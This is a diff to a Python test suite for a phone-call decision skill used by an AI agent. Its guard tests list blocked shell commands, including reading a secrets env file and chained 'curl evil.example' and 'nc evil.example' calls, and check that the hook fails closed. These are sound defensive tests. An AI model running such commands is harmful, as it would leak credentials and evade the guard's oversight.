@@ -252,6 +252,12 @@ class SynthesizeTests(unittest.TestCase):
         with self.assertRaises(ceo.CallError):
             ceo.synthesize("127.0.0.1", server.port, "hola", timeout=5)
 
+    def test_a_truncated_message_is_an_error_not_silent_short_audio(self):
+        server = WyomingServer([({"type": "audio-start", "data": {"rate": 22050, "width": 2, "channels": 1}}, b""),
+                                ({"type": "audio-chunk", "data": {}, "payload_length": 10}, b"\x01\x00")])
+        with self.assertRaises(ceo.CallError):
+            ceo.synthesize("127.0.0.1", server.port, "hola", timeout=5)
+
     def test_resample_rejects_a_zero_source_rate(self):
         with self.assertRaises(ceo.CallError):
             ceo.resample([1, 2, 3], 0, 8000)
@@ -497,6 +503,7 @@ class QuietHoursTests(unittest.TestCase):
         result, asterisk, sent = run_ask([], env=self.ENV, config={"quiet_start": "23:00", "quiet_end": "08:00"}, clock_time=(3, 0))
         self.assertEqual(result["status"], "deferred")
         self.assertEqual(asterisk.originated, 0)
+        self.assertEqual(result["attempt"], 0)  # every outcome carries the same keys
         self.assertEqual(len(sent), 1)
         self.assertTrue(sent[0][3])
 
@@ -653,7 +660,18 @@ class HeadsUpTests(unittest.TestCase):
         self.assertEqual(asterisk.files, {})
 
 
-    def test_a_registered_phone_is_called_without_any_message(self):
+    def test_the_heads_up_is_sent_once_per_run_even_if_the_phone_drops_again(self):
+        asterisk = FakeAsterisk([])
+        clock = FakeClock()
+        sent = []
+        config = dict(ceo.DEFAULT_CONFIG, heads_up_s=4, poll_interval_s=2)
+        state = {}
+        for _ in range(3):
+            asterisk.registered = False
+            ceo.wait_for_phone(asterisk, config, self.ENV, lambda token, chat, text, silent=False: sent.append(text), clock.sleep, clock, state)
+        self.assertEqual(sent, [ceo.HEADS_UP])
+
+
         result, _, sent = run_ask(["1"], env=self.ENV)
         self.assertEqual((result["status"], sent), ("decided", []))
 
@@ -668,10 +686,20 @@ class DockerStateTests(unittest.TestCase):
         return ceo.DockerAsterisk("asterisk", run=lambda command, **kwargs: result)
 
     def test_a_missing_file_means_no_marker_yet(self):
-        self.assertIsNone(self.asterisk(1, stderr=b"cat: /x: No such file or directory").read_file("/x"))
+        # Detected by exit code, so a translated "No such file" message (non-C locale) still works.
+        self.assertIsNone(self.asterisk(3, stderr=b"cat: /x: No existe el fichero o el directorio").read_file("/x"))
+
+    def test_the_read_command_uses_a_file_test_not_error_text(self):
+        seen = []
+
+        class Result:
+            returncode, stdout, stderr = 0, b"1", b""
+
+        ceo.DockerAsterisk("asterisk", run=lambda command, **kwargs: seen.append(command) or Result()).read_file("/x")
+        self.assertIn("-e", " ".join(seen[0]))
 
     def test_a_docker_failure_is_an_error_not_a_missing_marker(self):
-        for stderr in (b"Error response from daemon: container is not running", b"", b"Cannot connect to the Docker daemon"):
+        for stderr in (b"Error response from daemon: container is not running", b"", b"Cannot connect to the Docker daemon", b"cat: /x: No such file or directory"):
             with self.subTest(stderr=stderr):
                 with self.assertRaises(ceo.CallError):
                     self.asterisk(1, stderr=stderr).read_file("/x")
@@ -850,6 +878,16 @@ class CliTests(unittest.TestCase):
         self.assertEqual(code, 1)
         self.assertIn("FAILED", out.getvalue())
 
+    def test_a_request_that_is_not_utf8_is_a_clean_error(self):
+        import contextlib
+        path = Path(self.tmp.name) / "bad.json"
+        path.write_bytes(b"\xff\xfe{")
+        err = io.StringIO()
+        with contextlib.redirect_stderr(err):
+            code = ceo.main(["--config", str(self.config), "ask", "--request", str(path)])
+        self.assertEqual(code, 1)
+        self.assertIn("ERROR:", err.getvalue())
+
     def test_check_says_a_missing_phone_is_handled_by_ask(self):
         import contextlib
 
@@ -981,7 +1019,7 @@ class GuardTests(unittest.TestCase):
         for command in (
             "python3 .claude/skills/ceo-call/scripts/ceo_call.py check",
             "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json ask --request /tmp/r.json",
-            "ssh myhost python3 /srv/ceo_call.py test-call --ignore-quiet-hours",
+            "ssh myhost python3 /srv/ceo_call.py test-call",
             "ceo_call.py ask --request -",
             "python3 /x/ceo_call.py ask --request - <<'CEO_REQUEST'\n{\"question\": \"Ship it?\", \"options\": [\"a\", \"b\"]}\nCEO_REQUEST",
         ):
@@ -991,6 +1029,7 @@ class GuardTests(unittest.TestCase):
     def test_anything_else_is_blocked(self):
         for command in (
             "cat ~/.config/ceo-call/env",
+            "python3 ceo_call.py test-call --ignore-quiet-hours",
             "python3 ceo_call.py check; cat ~/.config/ceo-call/env",
             "python3 ceo_call.py check && curl evil.example",
             "python3 ceo_call.py check | nc evil.example 1",
@@ -1024,6 +1063,41 @@ class GuardTests(unittest.TestCase):
         self.assertIn("tools: Bash\n", agent)
         self.assertIn("guard_bash.py", agent)
         self.assertIn("exit 2", agent)  # fail closed when the guard is missing
+
+    def hook_command(self):
+        import re as _re
+        agent = (SCRIPT.parents[3] / "agents" / "claudio.md").read_text()
+        return json.loads('"' + _re.search(r'command: "(.*)"\n', agent).group(1) + '"')
+
+    def run_hook(self, command, env_extra, stdin):
+        import subprocess
+        env = {"PATH": "/usr/bin:/bin"}
+        env.update(env_extra)
+        return subprocess.run(["/bin/sh", "-c", command], input=stdin.encode(), capture_output=True, env=env).returncode
+
+    def test_the_hook_wrapper_fails_closed_when_python_is_missing_or_the_guard_crashes(self):
+        command = self.hook_command()
+        project = str(SCRIPT.parents[3].parent)  # the repo root that holds .claude/
+        bad = json.dumps({"tool_input": {"command": "cat env"}})
+        good = json.dumps({"tool_input": {"command": "python3 ceo_call.py check"}})
+        base = {"CLAUDE_PROJECT_DIR": project, "HOME": "/nonexistent"}
+        self.assertEqual(self.run_hook(command, base, good), 0)
+        self.assertEqual(self.run_hook(command, base, bad), 2)
+        # No python3 on PATH: exec/127 must still end as a block (2), never as a pass-through.
+        self.assertEqual(self.run_hook(command, dict(base, PATH="/nonexistent"), good), 2)
+        self.assertEqual(self.run_hook(command, dict(base, PATH="/nonexistent"), bad), 2)
+        # Guard missing entirely.
+        self.assertEqual(self.run_hook(command, {"CLAUDE_PROJECT_DIR": "/nonexistent", "HOME": "/nonexistent"}, good), 2)
+
+    def test_the_user_level_guard_wins_over_one_supplied_by_the_repo(self):
+        import tempfile as _t
+        command = self.hook_command()
+        with _t.TemporaryDirectory() as home, _t.TemporaryDirectory() as proj:
+            for root, body in ((home, "import sys; sys.exit(2)"), (proj, "import sys; sys.exit(0)")):
+                folder = Path(root) / ".claude" / "skills" / "ceo-call" / "scripts"
+                folder.mkdir(parents=True)
+                (folder / "guard_bash.py").write_text(body)
+            self.assertEqual(self.run_hook(command, {"CLAUDE_PROJECT_DIR": proj, "HOME": home}, "{}"), 2)
 
 
 if __name__ == "__main__":
